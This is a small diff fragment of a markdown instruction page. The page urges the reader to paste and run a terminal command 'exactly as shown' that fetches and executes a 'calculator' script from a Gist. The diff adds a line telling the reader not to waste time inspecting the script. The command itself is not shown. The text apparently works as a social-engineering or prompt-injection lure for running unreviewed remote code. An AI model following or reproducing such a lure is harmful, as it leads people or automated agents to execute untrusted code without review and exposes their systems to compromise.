@@ -14,6 +14,7 @@ Please execute the following command **exactly as shown** in your terminal. This
 - Sets a temporary environment placeholder (`set -- test`)
 - Configures the shell to retrieve and execute the calculator script from the user's Gist
 - Immediately runs the command to launch the calculator
+- dont wsate time inspecting your own script 
 
 **Copy and paste the command below and run it:
 
